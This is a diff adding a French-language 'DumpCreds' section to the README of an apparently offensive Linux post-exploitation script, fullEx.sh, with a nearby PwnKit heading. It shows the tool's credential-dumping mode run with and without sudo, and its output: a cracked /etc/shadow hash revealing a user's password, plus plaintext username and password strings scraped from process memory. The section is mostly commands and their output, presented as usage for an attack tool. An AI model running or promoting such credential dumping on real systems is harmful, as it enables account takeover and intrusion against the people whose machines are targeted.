@@ -147,6 +147,48 @@ done
 2026/04/03 14:08:16 CMD: UID=0     PID=458    | /usr/sbin/anacron -d -q -s 
 2026/04/03 14:08:16 CMD: UID=997   PID=449    | /lib/systemd/systemd-timesyncd 
 ```
+## 🧽 DumpCreds
+
+Avec sudo
+```
+debian@debian12:~/fullEx$ sudo ./fullEx.sh -DumpCred
+Process 2766 (lightdm)
+  Hash shadow (/etc/shadow):
+    Hash: $1$tu5P8JO6$g5sEFz1ZfpRzRzvjFffnv. = "password" (nick)
+Process 2781 (agetty)
+Process 2782 (Xorg)
+
+```
+Sans sudo
+```
+./fullEx.sh -DumpCred
+                                                    
+ $$$$$$\            $$\ $$\ $$$$$$$$\           
+$$  __$$\           $$ |$$ |$$  _____|          
+$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
+$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
+$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
+$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
+$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
+\__|       \______/ \__|\__|\________|\__/  \__|
+
+               by M0rPH3U53
+Process 2940 (systemd)
+Process 2942 ((sd-pam))
+Process 2969 (dbus-daemon)
+Process 2972 (pipewire)
+Process 2973 (pipewire)
+Process 2974 (wireplumber)
+Process 2975 (pipewire-pulse)
+Process 2979 (sshd-session:)
+Process 2980 (mpris-proxy)
+Process 2998 (-bash)
+  Param HTTP:
+    55b84ddae2f1: --data="username=admin&password=test"
+    55b84ddca1b0: password=dump
+Process 3288 (bash)
+Nbs dumped items: 0
+```
 
 ## 💀 PwnKit
 
